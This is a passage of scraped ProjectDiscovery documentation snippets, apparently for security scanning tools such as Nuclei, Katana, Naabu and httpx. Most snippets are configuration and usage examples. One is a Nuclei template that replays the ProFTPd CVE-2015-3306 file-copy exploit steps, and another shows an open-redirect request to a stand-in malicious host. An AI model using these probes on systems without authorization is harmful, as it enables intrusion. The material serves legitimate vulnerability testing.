(\n\t\"math\"\n\n\t\"github.com/projectdiscovery/gologger\"\n\t\"github.com/projectdiscovery/katana/pkg/engine/standard\"\n\t\"github.com/projectdiscovery/katana/pkg/output\"\n\t\"github.com/projectdiscovery/katana/pkg/types\"\n)\n\nfunc main() {\n\toptions := &types.Options{\n\t\tMaxDepth:     3,             // Maximum depth to crawl\n\t\tFieldScope:   \"rdn\",         // Crawling Scope Field\n\t\tBodyReadSize: math.MaxInt,   // Maximum response size to read\n\t\tTimeout:      10,            // Timeout is the time to wait for request in seconds\n\t\tConcurrency:  10,            // Concurrency is the number of concurrent crawling goroutines\n\t\tParallelism:  10,            // Parallelism is the number of urls processing goroutines\n\t\tDelay:        0,             // Delay is the delay between each crawl requests in seconds\n\t\tRateLimit:    150,           // Maximum requests to send per second\n\t\tStrategy:     \"depth-first\", // Visit strategy (depth-first, breadth-first)\n\t\tOnResult: func(result output.Result) { // Callback function to execute for result\n\t\t\tgologger.Info().Msg(result.Request.URL)\n\t\t},\n\t}\n\tcrawlerOptions, err := types.NewCrawlerOptions(options)\n\tif err != nil {\n\t\tgologger.Fatal().Msg(err.Error())\n\t}\n\tdefer crawlerOptions.Close()\n\tcrawler, err := standard.New(crawlerOptions)\n\tif err != nil {\n\t\tgologger.Fatal().Msg(err.Error())\n\t}\n\tdefer crawler.Close()\n\tvar input = \"https://www.hackerone.com\"\n\terr = crawler.Crawl(input)\n\tif err != nil {\n\t\tgologger.Warning().Msgf(\"Could not crawl %s: %s\", input, err.Error())\n\t}\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-Request Race Condition Configuration in Nuclei\nDESCRIPTION: Configuration snippet showing how to set up multi-request race condition testing with threads. This setting enables testing scenarios where multiple unique requests need to be sent simultaneously.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/race-conditions.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n    threads: 5\n    race: true\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Open Redirect Vulnerability in HTTP\nDESCRIPTION: This snippet shows an HTTP request and response that illustrates an open redirect vulnerability. The application redirects the user to the URL specified in the 'url' parameter without proper validation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/editor/ai.mdx#2025-04-12_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nGET /redirect?url=http://malicious.com HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 302 Found\nLocation: http://malicious.com\nContent-Length: 0\nServer: Apache\n```\n\n----------------------------------------\n\nTITLE: Executing MySQL Query with Options in JavaScript\nDESCRIPTION: Executes a MySQL query using custom connection options. Returns an SQLResult object containing the query results.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.MySQLClient.mdx#2025-04-12_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst mysql = require('nuclei/mysql');\nconst options = new mysql.MySQLOptions();\noptions.Host = 'acme.com';\noptions.Port = 3306;\nconst result = mysql.ExecuteQueryWithOpts(options, 'SELECT * FROM users');\nlog(to_json(result));\n```\n\n----------------------------------------\n\nTITLE: Verifying SMTP Server in JavaScript\nDESCRIPTION: Shows how to check if a host is running an SMTP server using the IsSMTP method.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.Client.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst client = new smtp.Client('acme.com', 25);\nconst isSMTP = client.IsSMTP();\nlog(isSMTP)\n```\n\n----------------------------------------\n\nTITLE: Piping Subfinder Results to HTTPX\nDESCRIPTION: This example shows how to pipe the discovered subdomains from Subfinder to HTTPX, which then finds running HTTP servers on the hosts. It demonstrates chaining tools for more comprehensive reconnaissance.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\necho hackerone.com | subfinder -silent | httpx -silent\n```\n\n----------------------------------------\n\nTITLE: Configuring Telegram Notifications in YAML\nDESCRIPTION: Telegram bot configuration with API key, chat ID and message format settings. Supports different parsing modes for message formatting.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/provider-config.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\ntelegram:\n  - id: \"tel\"\n    telegram_api_key: \"XXXXXXXXXXXX\"\n    telegram_chat_id: \"XXXXXXXX\"\n    telegram_format: \"{{data}}\"\n    telegram_parsemode: \"Markdown\"\n```\n\n----------------------------------------\n\nTITLE: Initializing LDAP Client - Basic Configuration\nDESCRIPTION: Creates a new LDAP client instance with basic configuration using server URL and realm.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\n// here ldap.example.com is the ldap server and acme.com is the realm\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\n```\n\n----------------------------------------\n\nTITLE: Creating Network Connection Example\nDESCRIPTION: Example showing how to create a basic TCP connection using the NetConn class.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\n```\n\n----------------------------------------\n\nTITLE: Receiving Partial String Data\nDESCRIPTION: Shows how to receive partial data as a string from the connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\nconst data = conn.RecvString(1024);\n```\n\n----------------------------------------\n\nTITLE: Displaying Naabu Command-Line Options in YAML\nDESCRIPTION: This code snippet shows the complete list of Naabu command-line options, including input, port selection, rate limiting, output, configuration, host discovery, optimization, and debugging flags. It provides a comprehensive overview of Naabu's capabilities and settings.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nUsage:\n  ./naabu [flags]\n\nINPUT:\n   -host string[]              hosts to scan ports for (comma-separated)\n   -list, -l string            list of hosts to scan ports (file)\n   -exclude-hosts, -eh string  hosts to exclude from the scan (comma-separated)\n   -exclude-file, -ef string   list of hosts to exclude from scan (file)\n\nPORT:\n   -port, -p string            ports to scan (80,443, 100-200)\n   -top-ports, -tp string      top ports to scan (default 100) [full,100,1000]\n   -exclude-ports, -ep string  ports to exclude from scan (comma-separated)\n   -ports-file, -pf string     list of ports to scan (file)\n   -port-threshold, -pts int   port threshold to skip port scan for the host\n   -exclude-cdn, -ec           skip full port scans for CDN/WAF (only scan for port 80,443)\n   -display-cdn, -cdn          display cdn in use\n\nRATE-LIMIT:\n   -c int     general internal worker threads (default 25)\n   -rate int  packets to send per second (default 1000)\n\nUPDATE:\n   -up, -update                 update naabu to latest version\n   -duc, -disable-update-check  disable automatic naabu update check\n\nOUTPUT:\n   -o, -output string  file to write output to (optional)\n   -j, -json           write output in JSON lines format\n   -csv                write output in csv format\n\nCONFIGURATION:\n   -scan-all-ips, -sa               scan all the IP's associated with DNS record\n   -ip-version, -iv string[]        ip version to scan of hostname (4,6) - (default 4)\n   -scan-type, -s string            type of port scan (SYN/CONNECT) (default \"s\")\n   -source-ip string                source ip and port (x.x.x.x:yyy)\n   -interface-list, -il             list available interfaces and public ip\n   -interface, -i string            network Interface to use for port scan\n   -nmap                            invoke nmap scan on targets (nmap must be installed) - Deprecated\n   -nmap-cli string                 nmap command to run on found results (example: -nmap-cli 'nmap -sV')\n   -r string                        list of custom resolver dns resolution (comma separated or from file)\n   -proxy string                    socks5 proxy (ip[:port] / fqdn[:port]\n   -proxy-auth string               socks5 proxy authentication (username:password)\n   -resume                          resume scan using resume.cfg\n   -stream                          stream mode (disables resume, nmap, verify, retries, shuffling, etc)\n   -passive                         display passive open ports using shodan internetdb api\n   -irt, -input-read-timeout value  timeout on input read (default 3m0s)\n   -no-stdin                        Disable Stdin processing\n\nHOST-DISCOVERY:\n   -sn, -host-discovery           Perform Only Host Discovery\n   -Pn, -skip-host-discovery      Skip Host discovery\n   -ps, -probe-tcp-syn string[]   TCP SYN Ping (host discovery needs to be enabled)\n   -pa, -probe-tcp-ack string[]   TCP ACK Ping (host discovery needs to be enabled)\n   -pe, -probe-icmp-echo          ICMP echo request Ping (host discovery needs to be enabled)\n   -pp, -probe-icmp-timestamp     ICMP timestamp request Ping (host discovery needs to be enabled)\n   -pm, -probe-icmp-address-mask  ICMP address mask request Ping (host discovery needs to be enabled)\n   -arp, -arp-ping                ARP ping (host discovery needs to be enabled)\n   -nd, -nd-ping                  IPv6 Neighbor Discovery (host discovery needs to be enabled)\n   -rev-ptr                       Reverse PTR lookup for input ips\n\nOPTIMIZATION:\n   -retries int       number of retries for the port scan (default 3)\n   -timeout int       millisecond to wait before timing out (default 1000)\n   -warm-up-time int  time in seconds between scan phases (default 2)\n   -ping              ping probes for verification of host\n   -verify            validate the ports again with TCP verification\n\nDEBUG:\n   -health-check, -hc        run diagnostic check up\n   -debug                    display debugging information\n   -verbose, -v              display verbose output\n   -no-color, -nc            disable colors in CLI output\n   -silent                   display only results in output\n   -version                  display version of naabu\n   -stats                    display stats of the running scan (deprecated)\n   -si, -stats-interval int  number of seconds to wait between showing a statistics update (deprecated) (default 5)\n   -mp, -metrics-port int    port to expose nuclei metrics on (default 63636)\n```\n\n----------------------------------------\n\nTITLE: Installing Nuclei using Helm\nDESCRIPTION: This set of commands clones the Nuclei repository and installs it using Helm. It creates a Kubernetes CronJob to run Nuclei on a schedule and an Interactsh service for Nuclei to use.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/install.mdx#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/projectdiscovery/nuclei.git\ncd nuclei/helm\nhelm upgrade --install nuclei . -f values.yaml\n```\n\n----------------------------------------\n\nTITLE: Using Helper Functions for Input in Nuclei Network Template\nDESCRIPTION: Shows how to use helper function expressions in input data. This example uses hex_decode to send the same data as the previous hex example.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\ninputs:\n  - data: 'hex_decode(\"50494e47\")\\r\\n'\n```\n\n----------------------------------------\n\nTITLE: Using Extension Denylist in Nuclei File Protocol\nDESCRIPTION: Configuration that matches all extensions except those explicitly denied. This example shows how to exclude specific extensions from processing.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/file.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nextensions:\n  - all\n\ndenylist:\n  - go\n  - py\n  - txt\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Multiple In-Scope Rules\nDESCRIPTION: Illustrates how to use a file containing multiple in-scope rules for crawling.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$ cat in_scope.txt\n\nlogin/\nadmin/\napp/\nwordpress/\n```\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -cs in_scope.txt\n```\n\n----------------------------------------\n\nTITLE: Matchers Condition in YAML\nDESCRIPTION: Shows how to use matchers-condition to combine multiple matchers with AND operation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\n    matchers-condition: and\n    matchers:\n      - type: word\n        words:\n          - \"X-Powered-By: PHP\"\n          - \"PHPSESSID\"\n        condition: or\n        part: header\n\n      - type: word\n        words:\n          - \"PHP\"\n        part: body\n```\n\n----------------------------------------\n\nTITLE: DNS Request Type Configuration\nDESCRIPTION: Demonstrates how to specify the DNS request type (A, NS, CNAME, etc.) in a Nuclei template.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/dns.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ntype: A\n```\n\n----------------------------------------\n\nTITLE: Multiple Matchers in HTTP Template\nDESCRIPTION: This template demonstrates how to use multiple matchers in OR condition for a single HTTP request. It checks for different server technologies (PHP, Node.js, Python) by examining response headers.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http-examples.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: http-multiple-matchers\n\ninfo:\n  name: Test HTTP Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}\"\n\n    matchers:\n      - type: word\n        name: php\n        words:\n          - \"X-Powered-By: PHP\"\n          - \"PHPSESSID\"\n        part: header\n\n      - type: word\n        name: node\n        words:\n          - \"Server: NodeJS\"\n          - \"X-Powered-By: nodejs\"\n        condition: or\n        part: header\n\n      - type: word\n        name: python\n        words:\n          - \"Python/2.\"\n          - \"Python/3.\"\n        part: header\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Additional Chrome Options\nDESCRIPTION: Illustrates how to provide additional Chrome options when running Katana in headless mode.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -headless -system-chrome -headless-options --disable-gpu,proxy-server=http://127.0.0.1:8080\n```\n\n----------------------------------------\n\nTITLE: Matching Specific File Extensions in Nuclei\nDESCRIPTION: Configuration to match only specific file extensions. This example shows how to limit file scanning to Python and Go files.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/file.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nextensions:\n  - py\n  - go\n```\n\n----------------------------------------\n\nTITLE: Encoding IKE Message\nDESCRIPTION: Shows how to encode a complete IKE message after adding payloads. The example demonstrates creating an IKEMessage, adding a nonce payload, and encoding the final message into a Uint8Array.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ikev2.IKEMessage.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst ikev2 = require('nuclei/ikev2');\nconst message = new ikev2.IKEMessage();\nconst nonce = new ikev2.IKENonce();\nnonce.NonceData = [1, 2, 3];\nmessage.AppendPayload(nonce);\nlog(message.Encode());\n```\n\n----------------------------------------\n\nTITLE: Using CheckRDPAuth Function with RDP Module\nDESCRIPTION: Demonstrates how to use the CheckRDPAuth function to authenticate with an RDP server. The function accepts a hostname and port number, returning an authentication response object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rdp.CheckRDPAuthResponse.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst rdp = require('nuclei/rdp');\nconst checkRDPAuth = rdp.CheckRDPAuth('acme.com', 3389);\nlog(toJSON(checkRDPAuth));\n```\n\n----------------------------------------\n\nTITLE: Using Buffer.Write() Method in JavaScript\nDESCRIPTION: Shows how to use the Write() method to append byte data (Uint8Array) to the buffer.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/bytes.Buffer.mdx#2025-04-12_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nconst bytes = require('nuclei/bytes');\nconst buffer = new bytes.Buffer();\nbuffer.Write([1, 2, 3]);\n```\n\n----------------------------------------\n\nTITLE: Using OpenAPI Schema in Nuclei\nDESCRIPTION: This command demonstrates how to use an OpenAPI schema file with Nuclei. The -l flag specifies the input file, and -im specifies the input mode as OpenAPI.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/input-formats.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnuclei -l openapi.yaml -im openapi\n```\n\n----------------------------------------\n\nTITLE: Configuring Azure Provider for Cloudlist\nDESCRIPTION: YAML configuration block for integrating Microsoft Azure with Cloudlist. Includes options for client credentials and CLI authentication.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: azure # provider is the name of the provider\n  # id is the name defined by user for filtering (optional)\n  id: staging\n  # client_id is the client ID of registered application of the azure account (not requuired if using cli auth)\n  client_id: $AZURE_CLIENT_ID\n  # client_secret is the secret ID of registered application of the zure account (not requuired if using cli uth)\n  client_secret: $AZURE_CLIENT_SECRET\n  # tenant_id is the tenant ID of registered application of the azure account (not requuired if using cli auth)\n  tenant_id: $AZURE_TENANT_ID\n  #subscription_id is the azure subscription id\n  subscription_id: $AZURE_SUBSCRIPTION_ID\n  #use_cli_auth if set to true cloudlist will use azure cli auth\n  use_cli_auth: true\n```\n\n----------------------------------------\n\nTITLE: LDAP NTLM Hash Authentication\nDESCRIPTION: Authenticates a user against the LDAP server using username and NTLM hash.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nclient.AuthenticateWithNTLMHash('pdtm', 'hash');\n```\n\n----------------------------------------\n\nTITLE: Creating and Configuring IKENotification in JavaScript\nDESCRIPTION: This snippet demonstrates how to create an instance of IKENotification and set its properties. It shows the usage of the ikev2 module to create a notification with a specific message type and data.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ikev2.IKENotification.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst ikev2 = require('nuclei/ikev2');\nconst notify = new ikev2.IKENotification();\nnotify.NotifyMessageType = ikev2.IKE_NOTIFY_NO_PROPOSAL_CHOSEN;\nnotify.NotificationData = [1, 2, 3];\n```\n\n----------------------------------------\n\nTITLE: Defining Simple Input Data in Nuclei Network Template\nDESCRIPTION: Specifies a simple string input to be sent across the network socket. This is the most basic form of input for network requests.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# inputs is the list of inputs to send to the server\ninputs: \n  - data: \"TEST\\r\\n\"\n```\n\n----------------------------------------\n\nTITLE: Setting Scan Strategy in Nuclei CLI\nDESCRIPTION: Configures the strategy for scanning targets in Nuclei, affecting resource utilization and scanning behavior.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n-ss <strategy> or -scan-strategy <strategy>\n```\n\n----------------------------------------\n\nTITLE: Configuring Discord Notifications in YAML\nDESCRIPTION: Discord webhook configuration with multiple channels. Specifies channel name, username, message format and webhook URL.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/provider-config.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ndiscord:\n  - id: \"crawl\"\n    discord_channel: \"crawl\"\n    discord_username: \"test\"\n    discord_format: \"{{data}}\"\n    discord_webhook_url: \"https://discord.com/api/webhooks/XXXXXXXX\"\n\n  - id: \"subs\"\n    discord_channel: \"subs\"\n    discord_username: \"test\"\n    discord_format: \"{{data}}\"\n    discord_webhook_url: \"https://discord.com/api/webhooks/XXXXXXXX\"\n```\n\n----------------------------------------\n\nTITLE: Error Page Classification\nDESCRIPTION: Demonstrates using the -fep flag to filter and classify error pages, reducing noise in results.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nhttpx -l urls.txt -path /v1/api -fep\n```\n\n----------------------------------------\n\nTITLE: Nuclei Command with Variables\nDESCRIPTION: This command shows how to use the -vars flag to provide missing parameters when using an OpenAPI schema with Nuclei. In this case, it's providing the X-API-Key parameter.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/input-formats.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n./nuclei -l rest-openapi.yaml -im openapi -vars \"X-API-Key=123\"\n```\n\n----------------------------------------\n\nTITLE: Filtering URLs by Extension in Katana\nDESCRIPTION: Demonstrates how to filter crawl output by excluding specific file extensions using the -ef flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_24\n\nLANGUAGE: shell\nCODE:\n```\nkatana -u https://tesla.com -silent -ef css,txt,md\n```\n\n----------------------------------------\n\nTITLE: Configuring GCP Provider for Cloudlist\nDESCRIPTION: YAML configuration block for integrating Google Cloud Platform with Cloudlist. Requires a service account key with appropriate permissions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: gcp # provider is the name of the provider\n  # profile is the name of the provider profile\n  id: logs\n  # gcp_service_account_key is the minified json of a google cloud service account with list permissions\n  gcp_service_account_key: '{xxxxxxxxxxxxx}'\n```\n\n----------------------------------------\n\nTITLE: Connecting to MS SQL Database with Specific DB in JavaScript\nDESCRIPTION: Connects to an MS SQL database using the provided credentials and database name. Returns a boolean indicating success or failure.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mssql.MSSQLClient.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst mssql = require('nuclei/mssql');\nconst client = new mssql.MSSQLClient;\nconst connected = client.ConnectWithDB('acme.com', 1433, 'username', 'password', 'master');\n```\n\n----------------------------------------\n\nTITLE: Running interactsh-client in Verbose Mode\nDESCRIPTION: This snippet demonstrates running interactsh-client in verbose mode, which displays the entire request and response, and saves the output to a file for later analysis.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/running.mdx#2025-04-12_snippet_2\n\nLANGUAGE: console\nCODE:\n```\ninteractsh-client -v -o interactsh-logs.txt\n\n    _       __                       __       __  \n   (_)___  / /____  _________ ______/ /______/ /_ \n  / / __ \\/ __/ _ \\/ ___/ __ '/ ___/ __/ ___/ __ \\\n / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /\n/_/_/ /_/\\__/\\___/_/   \\__,_/\\___/\\__/____/_/ /_/ 1.0.3\n\n    projectdiscovery.io\n\n[INF] Listing 1 payload for OOB Testing\n[INF] c58bduhe008dovpvhvugcfemp9yyyyyyn.oast.pro\n\n[c58bduhe008dovpvhvugcfemp9yyyyyyn] Received HTTP interaction from 103.22.142.211 at 2021-09-26 18:08:07\n------------\nHTTP Request\n------------\n\nGET /favicon.ico HTTP/2.0\nHost: c58bduhe008dovpvhvugcfemp9yyyyyyn.oast.pro\nReferer: https://c58bduhe008dovpvhvugcfemp9yyyyyyn.oast.pro\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\n\n\n-------------\nHTTP Response\n-------------\n\nHTTP/1.1 200 OK\nConnection: close\nContent-Type: text/html; charset=utf-8\nServer: oast.pro\n\n<html><head></head><body>nyyyyyy9pmefcguvhvpvod800ehudb85c</body></html>\n```\n\n----------------------------------------\n\nTITLE: Appending Payload to IKE Message\nDESCRIPTION: Demonstrates how to create an IKE message and append a nonce payload to it. The example shows the creation of an IKEMessage instance, creating an IKENonce payload with sample data, and appending it to the message.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ikev2.IKEMessage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst ikev2 = require('nuclei/ikev2');\nconst message = new ikev2.IKEMessage();\nconst nonce = new ikev2.IKENonce();\nnonce.NonceData = [1, 2, 3];\nmessage.AppendPayload(nonce);\n```\n\n----------------------------------------\n\nTITLE: Configuring LDAP Client in JavaScript\nDESCRIPTION: This snippet demonstrates how to create and configure an LDAP client using the Config object. It sets the timeout, server name, and enables TLS upgrade.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Config.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst cfg = new ldap.Config();\ncfg.Timeout = 10;\ncfg.ServerName = 'ldap.internal.acme.com';\ncfg.Upgrade = true; // upgrade to tls\n```\n\n----------------------------------------\n\nTITLE: Sending String Data\nDESCRIPTION: Demonstrates sending a string over the network connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\nconn.Send('hello');\n```\n\n----------------------------------------\n\nTITLE: Embedding Python Code Snippet in Nuclei Template\nDESCRIPTION: Embeds a Python code snippet directly within the Nuclei template that reads from stdin and prints output. This avoids the need for external files.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/code.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nsource: |\n      import sys\n      print(\"hello from \" + sys.stdin.read())\n```\n\n----------------------------------------\n\nTITLE: Basic Naabu Port Scan in Bash\nDESCRIPTION: Run a basic Naabu port scan on hackerone.com. This command will scan the default top 100 ports.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nnaabu -host hackerone.com\n```\n\n----------------------------------------\n\nTITLE: Configuring Fastly Provider in YAML\nDESCRIPTION: Example configuration block for integrating Fastly with Cloudlist. Requires a personal API token generated from the Fastly account management page.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: fastly\n  id: staging\n  fastly_api_key: $FASTLY_API_KEY\n```\n\n----------------------------------------\n\nTITLE: DNS Retry Configuration\nDESCRIPTION: Demonstrates setting the number of retry attempts for DNS queries before giving up.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/dns.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nretries: 3\n```\n\n----------------------------------------\n\nTITLE: Defining Kval Extractor in YAML for Nuclei\nDESCRIPTION: Example of a kval extractor to extract the 'content-type' header from the HTTP response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/extractors.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nextractors:\n  - type: kval # type of the extractor\n    kval:\n      - content_type # header/cookie value to extract from response\n```\n\n----------------------------------------\n\nTITLE: Uncover File Input Processing\nDESCRIPTION: Shows how to run uncover with a file containing multiple search queries using the -q flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/uncover/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: console\nCODE:\n```\ncat dorks.txt\n\nssl:\"Uber Technologies, Inc.\"\ntitle:\"Grafana\"\n```\n\nLANGUAGE: console\nCODE:\n```\nuncover -q dorks.txt\n```\n\n----------------------------------------\n\nTITLE: Initializing Kerberos Client\nDESCRIPTION: Creates a new Kerberos client instance with domain and optional KDC controller. If controller is not specified, DNS lookup will be performed for the default KDC server.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.Client.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst kerberos = require('nuclei/kerberos');\n// if controller is empty a dns lookup for default kdc server will be performed\nconst client = new kerberos.Client('acme.com', 'kdc.acme.com');\n```\n\n----------------------------------------\n\nTITLE: ProFTPd RCE Multi-Step Template in YAML\nDESCRIPTION: Complex template for ProFTPd RCE vulnerability (CVE-2015-3306) detection using multiple sequential requests with random string generation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network-examples.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nid: CVE-2015-3306\n\ninfo:\n  name: ProFTPd RCE\n  author: pd-team\n  severity: high\n  reference: https://github.com/t0kx/exploit-CVE-2015-3306\n  tags: cve,cve2015,ftp,rce\n\ntcp:\n  - inputs:\n      - data: \"site cpfr /proc/self/cmdline\\r\\n\"\n        read: 1024\n      - data: \"site cpto /tmp/.{{randstr}}\\r\\n\"\n        read: 1024\n      - data: \"site cpfr /tmp/.{{randstr}}\\r\\n\"\n        read: 1024\n      - data: \"site cpto /var/www/html/{{randstr}}\\r\\n\"\n    host:\n      - \"{{Hostname}}\"\n    read-size: 1024\n    matchers:\n      - type: word\n        words:\n          - \"Copy successful\"\n```\n\n----------------------------------------\n\nTITLE: Multiple Matchers in YAML\nDESCRIPTION: Demonstrates using multiple matchers in a single template for different conditions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nmatchers:\n  - type: word\n    name: php\n    words:\n      - \"X-Powered-By: PHP\"\n      - \"PHPSESSID\"\n    part: header\n  - type: word\n    name: node\n    words:\n      - \"Server: NodeJS\"\n      - \"X-Powered-By: nodejs\"\n    condition: or\n    part: header\n  - type: word\n    name: python\n    words:\n      - \"Python/2.\"\n      - 